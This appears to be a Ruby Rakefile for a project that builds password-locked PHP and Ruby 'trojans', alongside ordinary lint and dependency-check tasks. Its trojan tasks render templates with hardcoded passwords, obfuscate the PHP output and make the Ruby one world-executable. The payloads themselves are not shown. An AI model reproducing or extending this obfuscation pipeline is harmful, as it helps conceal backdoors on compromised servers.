
# specify passwords to lock each trojan
locks = {
    :one => {
        :password => 'b4afcf3d99',
        :salt     => 'ddb28e78ab',
        :hash     => 'the-hash',
    },
    :two => {
        :password => '3dadef2cf4',
        :salt     => '6cbdb4798a',
        :hash     => 'the-hash',
    },
}

# ----------------------------------------------------------------------------
require 'digest/sha1'
require 'erb'
include ERB::Util

namespace :check do
    desc "Checks system dependencies"
    task :dependencies do

        # check for shell dependencies
        puts 'Checking shell dependencies...'
        satisfied = true
        shell_dependencies = %w[ack-grep gem grep jshint nodejs npm php ruby]
        shell_dependencies.each do |d|
            if `which #{d}`.empty?
                puts "Missing: shell dependency #{d} is NOT installed." 
                satisfied = false
            end
        end
        puts "All shell dependencies appear to be satisfied." if satisfied
    end

    desc "Searches for todos and such in the source"
    task :todos do
        puts `ack-grep --norake "@todo" .`
        puts `ack-grep --norake "@bug" .`
        puts `ack-grep --norake "@kludge" .`
        puts `ack-grep --norake "@fixme" .`
    end
end

namespace :test do
    namespace :lint do
        desc "Runs all source files through an appropriate linter"
        task :all do
            Rake::Task['test:lint:js'].execute
            Rake::Task['test:lint:php'].execute
            Rake::Task['test:lint:ruby'].execute
        end

        desc "Runs JavaScript files through jshint"
        task :js do
            puts 'Checking JavaScript files...'
            js_files = `find . -name vendor -prune -o -name '*.js' | grep -v 'vendor'`.split "\n"
            js_files.each do |f|
                lint_out = `jshint --config ./lib/build/jshint-config.json #{f}`
                # don't output empty lines which would otherwise be outputted
                # when a file contains no errors
                puts lint_out unless lint_out.strip!.to_s.empty?
            end
        end

        desc "Runs PHP files through the linter (php -l)"
        task :php do
            puts 'Checking PHP files...'
            puts `find . -iname '*.php' -print0 | xargs -0 -n1 -P10 php -l`
        end

        desc "Runs Ruby files through the linter (ruby -wc)"
        task :ruby do
            puts 'Checking Ruby files...'
            puts `find . -iname '*.rb' -print0 | xargs -0 -n1 -P10 ruby -wc`
        end
    end

    namespace :suite do

    end
end

namespace :trojan do
    namespace :build do

        desc "Compiles all of the trojans"
        task :all do
            Rake::Task['trojan:build:php'].execute
            Rake::Task['trojan:build:ruby'].execute
        end

        desc "Compiles the trojan into a minified and obfuscated form"
        task :php do
            # notify the user
            print 'Compiling PHP trojan....'

            # calculate the password hash
            locks[:one][:hash] = Digest::SHA1.hexdigest(locks[:one][:password] + locks[:one][:salt])

            # compile the trojan's erb template
            erb = ERB.new(File.read('./trojans/plaintext/trojan.php.erb'), 0, '<>', 'buffer')

            # write the erb result to a temporary file
            f = File.new('./trojans/plaintext/tmp.trojan.php', 'w')
            f.write(erb.result(binding))
            f.close

            # process the temporary file with the PHP minifier and obfuscator
            `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`

            # delete the temporary file
            File.delete('./trojans/plaintext/tmp.trojan.php')
            
            # complete
            puts 'done.'
        end

        desc "Compiles the trojan into a minified and obfuscated form"
        task :ruby do
            # notify the user
            print 'Compiling Ruby trojan...'

            # calculate the password hash
            locks[:two][:hash] = Digest::SHA1.hexdigest(locks[:two][:password] + locks[:two][:salt])

            # compile the trojan's erb template
            erb = ERB.new(File.read('./trojans/plaintext/trojan.rb.erb'), 0, '<>', 'buffer')

            # write the erb result to a temporary file
            #f = File.new('./trojans/plaintext/tmp.trojan.rb', 'w')
            f = File.new('./trojans/obfuscated/o.rb', 'w')
            f.write(erb.result(binding))
            f.close

            # set execute permissions on the trojan
            File.chmod(0777, './trojans/obfuscated/o.rb')

            # process the temporary file with the PHP minifier and obfuscator
            #puts `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`

            # delete the temporary file
            #File.delete('./trojans/plaintext/tmp.trojan.php')
            
            # complete
            puts 'done.'
        end
    end
end
